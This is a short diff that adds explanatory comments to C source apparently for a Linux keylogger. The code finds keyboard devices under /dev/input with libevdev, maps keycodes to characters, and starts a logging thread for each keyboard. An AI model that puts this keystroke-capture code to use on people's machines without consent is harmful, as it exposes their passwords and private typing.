@@ -68,6 +68,7 @@ static const char table[256] = {
   [57] = ' ',
 };
 
+//secondary key-map for shift mode
 static const char shift_table[256] = {
   [0] = '\0',
   [KEY_GRAVE] = '~',
@@ -93,9 +94,12 @@ static const char shift_table[256] = {
   [KEY_SLASH] = '?', 
 };
 
+
+//Function that gets all keyboards
 int get_kb(char list[20][PATH_MAX], int list_size){
   struct libevdev *dev;
   struct dirent *de;
+  //check /dev/input
   DIR *dr = opendir("/dev/input");
 
   if (dr == NULL) {
@@ -147,6 +151,7 @@ int get_kb(char list[20][PATH_MAX], int list_size){
   return i;
 }
 
+//main logging function
 void* logger(void* kb_path){
   //open up the kb input event file
   int fd = open(kb_path, O_RDONLY);
@@ -217,6 +222,7 @@ int main(){
   int list_size = sizeof(list)/sizeof(list[0]);
   int size = get_kb(list, list_size);
 
+  //multithreading for each kb
   pthread_t *threads = malloc(size * sizeof(pthread_t));
   
   for(int i = 0; i < size; i++){
